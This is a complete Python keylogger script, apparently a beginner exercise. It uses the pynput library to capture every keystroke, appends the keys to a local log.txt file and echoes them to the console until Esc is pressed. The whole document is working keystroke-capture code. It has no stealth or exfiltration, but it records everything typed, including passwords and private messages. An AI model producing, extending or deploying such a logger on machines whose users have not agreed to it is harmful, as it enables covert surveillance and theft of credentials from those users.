
from pynput import keyboard
import os

key_log=""      #this will store all the keys pressed

def write_to_file(log_data):
    #This line opens a file named log.txt in append mode ("a").
    with open("log.txt", "a") as file:
        file.write(log_data)

def on_press(key):
    global key_log

    try:
        #for alphabetical and numerical keys
        key_log = key_log + str(key.char)
    except AttributeError:
        #for special keys (e.g. space, enter)
        key_log = key_log + f'[{key.name}]' #f for format

    print("Key logged:",key_log)

    write_to_file(str(key.char) if hasattr(key, 'char') else f'[{key.name}]')

def on_release(key):
    #Stop the listener if esc is released
    if key == keyboard.Key.esc:
        print("Escape pressed. Exiting...")
        return False   #This stops the listener

#starts the listener on both on_press and on_release
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#Check path for log.txt
print("Saving log to:", os.path.abspath("log.txt"))